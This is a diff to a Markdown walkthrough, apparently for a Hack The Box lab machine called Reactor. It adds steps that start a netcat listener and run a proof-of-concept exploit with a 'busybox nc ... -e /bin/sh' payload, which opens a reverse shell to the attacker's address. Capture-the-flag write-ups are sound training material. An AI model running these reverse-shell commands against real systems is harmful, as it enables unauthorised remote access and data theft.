@@ -1007,15 +1007,21 @@ You can also use `poc.py` but you'd have to:
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ nc -lvnp 4444
+```
+
+2. Trigger the reverse shell via the exploit:
+
+```shell
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 poc.py "busybox nc 10.10.14.85 4444 -e /bin/sh"
 0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
 1:E{"digest":"4014292262"}
 ```
 
+Once the shell connects, query the DB we foound 
 
 
-```
-```
 <div align="center">
 <br>
 <br>
